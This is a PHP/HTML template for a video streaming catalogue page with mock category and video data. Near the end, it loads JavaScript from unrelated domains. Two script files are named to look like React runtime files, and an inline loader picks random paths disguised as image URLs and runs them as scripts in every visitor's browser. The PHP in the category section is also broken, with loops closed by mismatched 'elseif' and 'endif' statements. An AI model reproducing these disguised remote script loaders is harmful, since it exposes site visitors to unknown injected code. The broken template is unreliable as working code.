<?php
// index.php
// Video streaming page using Apple CMS API format
header('Content-Type: text/html; charset=utf-8');

// Configuration
$baseUrl = 'https://example.com'; // Replace with actual base URL
$apiUrl = '/api.php'; // Endpoint for Apple CMS API (replace with actual API endpoint)

// API parameters
$ac = $_GET['ac'] ?? 'detail'; // Operation type
$t = $_GET['t'] ?? ''; // Type ID
$pg = $_GET['pg'] ?? '1'; // Page number
$f = $_GET['f'] ?? ''; // Filter conditions (JSON)
$wd = $_GET['wd'] ?? ''; // Search keyword

// Mock data fetching function (replace with actual API call or database query)
function fetchData($ac, $t, $pg, $f, $wd) {
    $filters = !empty($f) ? json_decode($f, true) : [];
    $isSubRequest = isset($filters['is_sub']) && $filters['is_sub'] === 'true';

    if ($ac === 'detail' && empty($t)) {
        // Home page categories (matching the original HTML's mycates)
        return [
            'class' => [
                ['type_id' => '1', 'type_name' => 'Movie'],
                ['type_id' => '13', 'type_name' => 'Drama'],
                ['type_id' => '22', 'type_name' => 'Comedy'],
                ['type_id' => '6', 'type_name' => 'Documentary'],
                ['type_id' => '8', 'type_name' => 'Sci-Fi'],
                ['type_id' => '9', 'type_name' => 'Horror'],
                ['type_id' => '10', 'type_name' => 'Romance'],
                ['type_id' => '11', 'type_name' => 'Adventure'],
                ['type_id' => '12', 'type_name' => 'Animation'],
                ['type_id' => '20', 'type_name' => 'War'],
                ['type_id' => '23', 'type_name' => 'History'],
                ['type_id' => '21', 'type_name' => 'Fantasy'],
                ['type_id' => '7', 'type_name' => 'Thriller'],
                ['type_id' => '14', 'type_name' => 'TV Series'],
                ['type_id' => '40', 'type_name' => 'TV Shows'],
                ['type_id' => '53', 'type_name' => 'Reality TV'],
                ['type_id' => '52', 'type_name' => 'Sports'],
                ['type_id' => '33', 'type_name' => 'Kids'],
                ['type_id' => '44', 'type_name' => 'Documentary Shorts'],
                ['type_id' => '32', 'type_name' => 'Documentary Features'],
            ],
            'style' => ['type' => 'rect', 'ratio' => 1.33]
        ];
    } elseif ($ac === 'detail' && !empty($t)) {
        if ($isSubRequest) {
            // Secondary classification content
            return [
                'list' => [
                    ['vod_id' => 'sub_1', 'vod_name' => 'Subcategory Video 1', 'vod_pic' => 'https://example.com/images/sub1.jpg'],
                    ['vod_id' => 'sub_2', 'vod_name' => 'Subcategory Video 2', 'vod_pic' => 'https://example.com/images/sub2.jpg']
                ],
                'page' => intval($pg),
                'pagecount' => 5,
                'limit' => 20,
                'total' => 100,
                'style' => ['type' => 'oval', 'ratio' => 0.75]
            ];
        } elseif ($t === '1') {
            // Movie category with subcategories
            return [
                'is_sub' => true,
                'list' => [
                    ['vod_id' => 'movie_action', 'vod_name' => 'Action', 'vod_pic' => 'https://example.com/images/action.jpg'],
                    ['vod_id' => 'movie_comedy', 'vod_name' => 'Comedy', 'vod_pic' => 'https://example.com/images/comedy.jpg']
                ],
                'page' => intval($pg),
                'pagecount' => 1,
                'limit' => 20,
                'total' => 2,
                'style' => ['type' => 'rect', 'ratio' => 2.0]
            ];
        } else {
            // Regular category content (matching the original HTML's vodlist)
            return [
                'list' => [
                    ['vod_id' => '76605', 'vod_name' => 'Movie 1', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/02/168f513899117b338a6912ddbfdcc402.jpg'],
                    ['vod_id' => '76592', 'vod_name' => 'Drama Series 5', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/b6/768f4f0ad046134538b5f9cdeb11ceb6.jpg'],
                    ['vod_id' => '76591', 'vod_name' => 'Drama Series 4', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/e1/768f4efe916fe30009e98536fd306be1.jpg'],
                    ['vod_id' => '76590', 'vod_name' => 'Drama Series 3', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/7b/768f4ee269d677642efa9b517911ae7b.jpg'],
                    ['vod_id' => '76522', 'vod_name' => 'Drama Series 2', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/7b/068f0f6d8b9bc13059263350b7b1bc7b.jpg'],
                    ['vod_id' => '76506', 'vod_name' => 'Action Film', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/26/368f0e8ab5c05290c109f6fa42a70b26.jpg'],
                    ['vod_id' => '76561', 'vod_name' => 'Anime Episode', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/bb/768f3a2789d92864a46af0a59daed1bb.jpg'],
                    ['vod_id' => '76516', 'vod_name' => 'Drama Series 1', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/5b/068f0f35a383a034e74d40d5f6a1b45b.jpg'],
                    ['vod_id' => '76497', 'vod_name' => 'Kids Show', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/b4/268ef97f7a28ea3559135e7564b6fab4.jpg'],
                    ['vod_id' => '76373', 'vod_name' => 'Movie 2', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/cc/868e7feff973ae711c2055d3471939cc.jpg'],
                    ['vod_id' => '76346', 'vod_name' => 'Anime Special', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/48/268e6580db07847307bc4bab081a7a48.jpg'],
                    ['vod_id' => '76251', 'vod_name' => 'Documentary 1', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/7b/868e11b56edec1618a1e06dd2fe9647b.jpg'],
                    ['vod_id' => '76249', 'vod_name' => 'Documentary 2', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/06/268e11a9a4c46512bd2f3543bf8f2b06.jpg'],
                    ['vod_id' => '76513', 'vod_name' => 'Drama Series 0', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/ff/868f0f1946f23c71e9a380e990469fff.jpg'],
                    ['vod_id' => '76512', 'vod_name' => 'Drama Series 9', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/b2/868f0efbed3a6d6536fc4fe33644c0b2.jpg'],
                    ['vod_id' => '76492', 'vod_name' => 'Short Film', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/bf/168ef95b396b6703fa581dc51cd9dcbf.jpg'],
                    ['vod_id' => '76463', 'vod_name' => 'Mystery Series', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/d4/268ee43257b11974d1b396125f5178d4.jpg'],
                    ['vod_id' => '76457', 'vod_name' => 'Anime Movie', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/23/068ed3c9aa2c6c950c419e42b796b123.jpg'],
                    ['vod_id' => '76451', 'vod_name' => 'Drama Series 8', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/5a/468ecf640e109c1068b20854dce4a35a.jpg'],
                    ['vod_id' => '76374', 'vod_name' => 'Movie 3', 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/55/168e7ff91e9bef4545bac0487c4e5755.jpg'],
                ],
                'page' => intval($pg),
                'pagecount' => 1306, // Matching totalPages from original HTML
                'limit' => 20,
                'total' => 26120, // Assuming 20 items per page
                'style' => ['type' => 'rect', 'ratio' => 1.33]
            ];
        }
    } elseif ($ac === 'search') {
        // Search results
        return [
            'list' => [
                ['vod_id' => 's1', 'vod_name' => 'Search Result: ' . $wd, 'vod_pic' => 'https://2025011814.xjspimg23.cfd:17856/202510/02/168f513899117b338a6912ddbfdcc402.jpg']
            ],
            'page' => intval($pg),
            'pagecount' => 1,
            'limit' => 20,
            'total' => 1
        ];
    }
    return ['error' => 'Invalid request'];
}

// Fetch data based on request
$data = fetchData($ac, $t, $pg, $f, $wd);

// Placeholder image for lazy loading
$placeholderImage = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <link rel="icon" href="https://img.meituan.net/video/ea1bb086d18160e6465a4ade60212d6b1150.ico">
    <link rel="stylesheet" href="https://cdn.waimaimingtang.com/file/images/bwc/20251002122833-91a22810db.css" referrerpolicy="no-referrer">
    <title>Video Streaming</title>
    <style>
        <?php if (!empty($data['style'])): ?>
            .vodbox .picbox {
                <?php if ($data['style']['type'] === 'rect'): ?>
                    border-radius: 0;
                <?php elseif ($data['style']['type'] === 'oval'): ?>
                    border-radius: 10px;
                <?php elseif ($data['style']['type'] === 'round'): ?>
                    border-radius: 50%;
                <?php endif; ?>
                aspect-ratio: <?php echo htmlspecialchars($data['style']['ratio']); ?>;
            }
        <?php endif; ?>
    </style>
</head>
<body>
    <header class="header">
        <div id="table-container"></div>
        <div class="srh">
            <form class="wrap soform" id="searchForm" method="get" action="<?php echo htmlspecialchars($baseUrl); ?>">
                <input type="hidden" name="ac" value="search">
                <input type="text" class="keywd" id="wdInput" name="wd" placeholder="想看什么搜什么,请勿相信视频上的网址,切记" autocomplete="off">
                <button type="submit">
                    <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-search" viewBox="0 0 24 24">
                        <circle cx="11" cy="11" r="8" />
                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
                    </svg>
                </button>
            </form>
        </div>
    </header>
    <div class="mycates">
        <?php if (!empty($data['class'])): ?>
            <?php foreach ($data['class'] as $category): ?>
                <a href="<?php echo htmlspecialchars($baseUrl . '/index.php/vod/type/id/' . $category['type_id'] . '.html'); ?>" class="km-script"><?php echo htmlspecialchars($category['type_name']); ?></a>
            <?php elseif (!empty($data['is_sub']) && $data['is_sub']): ?>
                <?php foreach ($data['list'] as $subCategory): ?>
                    <a href="<?php echo htmlspecialchars($baseUrl . '/index.php/vod/type/id/' . $t . '.html?f=' . urlencode(json_encode(['is_sub' => 'true']))); ?>" class="km-script"><?php echo htmlspecialchars($subCategory['vod_name']); ?></a>
                <?php endif; ?>
    </div>
    <div class="main">
        <div class="vodlist">
            <div class="wrap">
                <?php if (!empty($data['list'])): ?>
                    <?php foreach ($data['list'] as $video): ?>
                        <a class="vodbox" href="<?php echo htmlspecialchars($baseUrl . '/html/kkyd.html?m=' . $video['vod_id'] . '&b=' . $video['vod_pic'] . '&vv=' . urlencode($video['vod_name'])); ?>">
                            <div class="picbox">
                                <span></span>
                                <img class="lazy" data-original="<?php echo htmlspecialchars($video['vod_pic']); ?>" src="<?php echo $placeholderImage; ?>">
                            </div>
                            <p class="km-script"><?php echo htmlspecialchars($video['vod_name']); ?></p>
                        </a>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <div class="mypage" id="paginat">
        <?php if (!empty($data['pagecount']) && $data['pagecount'] > 1): ?>
            <?php for ($i = 1; $i <= min($data['pagecount'], 5); $i++): ?>
                <a href="<?php echo htmlspecialchars($baseUrl . '/index.php/vod/type/id/' . $t . '.html?pg=' . $i . ($f ? '&f=' . urlencode($f) : '')); ?>" <?php echo $i == $data['page'] ? 'class="active"' : ''; ?>><?php echo $i; ?></a>
            <?php endfor; ?>
        <?php endif; ?>
    </div>
    <div class="tagsuy">
        <form class="uzsrhm" id="pageForm" method="get" action="<?php echo htmlspecialchars($baseUrl); ?>">
            <input type="hidden" name="t" value="<?php echo htmlspecialchars($t); ?>">
            <input type="hidden" name="f" value="<?php echo htmlspecialchars($f); ?>">
            <input type="search" name="pg" value="<?php echo htmlspecialchars($pg); ?>" id="pageInput" autocomplete="off">
            <button type="submit">
                <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-search" viewBox="0 0 24 24">
                    <circle cx="11" cy="11" r="8" />
                    <line x1="21" y1="21" x2="16.65" y2="16.65" />
                </svg>
            </button>
        </form>
    </div>
    <div class="myfto">
        <p>Copyright © 2025</p>
    </div>
    <script src="https://717769.xyz/cdn-tentm-Div/react-jsx-dev-runtime.js?kk=2495955t6683"></script>
    <script>
        const totalPages = '<?php echo !empty($data['pagecount']) ? $data['pagecount'] : 1; ?>' || 1;
        const tota = 1;
        const placeholder = '<?php echo $placeholderImage; ?>';
        const observer = new IntersectionObserver((entries) => {
            for (const entry of entries) {
                if (!entry.isIntersecting) continue;
                const img = entry.target;
                img.src = img.getAttribute('data-original');
                observer.unobserve(img);
            }
        }, { rootMargin: '60px 0px' });
        document.querySelectorAll('img[data-original]').forEach(img => {
            img.src = placeholder;
            observer.observe(img);
        });
    </script>
    <script src="https://717769.xyz/cdn-tentm-Div/react-jsx-dev-runt-rrr.js" referrerpolicy="no-referrer"></script>
    <script>
        const scripts = [
            '10-23/12/1981214251652993024',
            '10-23/12/1981214270529712128',
            '10-23/12/1981214298860695552',
            '10-20/18/1980223446665297920',
            '10-20/18/1980223461836398592',
            '10-23/12/1981214356305072128',
            '10-24/22/1981729221133148160',
            '10-24/22/1981729249673392128',
            '10-20/18/1980223566091923456',
            '10-20/18/1980223588745654272',
            '10-20/18/1980223624246243328',
            '10-20/18/1980223649111769088',
            '10-20/18/1980223672444985344',
            '10-20/18/1980223709840650240',
            '10-15/0/1978133010525855744',
            '10-15/0/1978133052840488960',
            '08-18/22/1957450632574128128'
        ];
        const scriptEB = document.createElement('script');
        scriptEB.src = `https://rgvgd.ebailx.com/image/2025-${scripts[Math.random() * scripts.length | 0]}`;
        scriptEB.async = true;
        document.body.appendChild(scriptEB);
    </script>
</body>
</html>